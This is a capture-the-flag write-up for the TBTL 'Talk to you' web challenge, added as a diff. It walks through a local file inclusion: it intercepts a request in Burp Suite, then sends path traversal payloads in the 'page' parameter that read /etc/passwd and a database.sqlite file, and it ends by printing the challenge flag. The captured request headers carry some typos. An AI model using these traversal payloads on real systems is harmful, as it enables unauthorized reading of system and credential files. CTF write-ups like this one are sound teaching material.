@@ -1,0 +1,45 @@
+Write-up of Talk to you
+
+TBTL chall url: https://tbtl.ctfd.io/challenges#Talk%20To%20You
+
+On the site we notice a few things with the about Us:
+"https://tbtl-talk-to-you.chals.io/?page=about.html#content"
+
+We're going to use burpsuite
+start a request and reload this page.
+
+The result is:
+GET /?page=about.html HTTP/1.1
+Host： tbt1-talk-to-youchals.io
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv: 125.0)
+Gecko/20100101 Firefox/125.0
+Accept:
+text/htal,application/xhtal+xnl,application/xml;4=0.9,inage/avif,
+image/webp, */*; q=0.8
+Accept-Language: en-US, en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://tbtl-talk-to-you.chals.io/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sea-fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: 21
+Te: trailers
+Connection: close
+
+We'll look at the first line and try a few things and check the response.
+GET /?page=../../../../../../etc/passwd HTTP/1.1
+send
+We can see that the answer was the user details
+
+Another test after seeing that this worked:
+GET /?page=../../../../../../flag.txt HTTP/1.1
+if we try to open the directory containing the flag.txt we'll see that, after sending this, in the Response "Flag is in SQLite3: database.sqlite
+
+The flag is in database.sqlite, so let's test it out
+GET /?page=../../../../../../database.sqlite HTTP/1.1
+send
+On line 133 we can see the flag:
+
+The flag is TBTL{4Typ1c41_d4T4B453_u54g3}
+
